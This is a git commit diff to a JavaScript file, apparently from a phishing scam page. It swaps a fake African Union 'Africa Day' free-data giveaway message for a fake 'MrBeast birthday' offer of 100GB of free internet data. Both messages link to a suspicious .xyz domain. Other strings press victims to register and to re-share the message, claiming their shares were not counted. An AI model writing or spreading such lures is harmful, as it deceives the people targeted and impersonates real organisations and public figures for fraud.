bac70e6ce224282146d6a2b73e6fc6b31470dde2
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-07 14:51:22 -0700

    Update africa-day2024.js

--- africa-day2024.js
+++ africa-day2024.js
@@ -1,4 +1,4 @@
- var text1 = "*AFRICA DAY CELEBRATION 2024*%0A%0A_African Union Commission in partnership with all network operators to celebrate 2024 Africa Day by giving out 50GB Free internet Data_%0A%0A*Sponsored by: African Union*%0A%0A_Click Here to get yours_👇%0Ahttps://2024-program.xyz/africa-day",
+ var text1 = "*MrBeast 26th Birthday Celebration*%0A%0A_MrBeast in partnership with all network operators to celebrate his 26th BirthDay by giving out 100GB Free internet Data to everyone_%0A%0A*Sponsored by: MrBeast*%0A%0A_Click Here to get yours_👇%0Ahttps://2024-program.xyz/africa-day",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
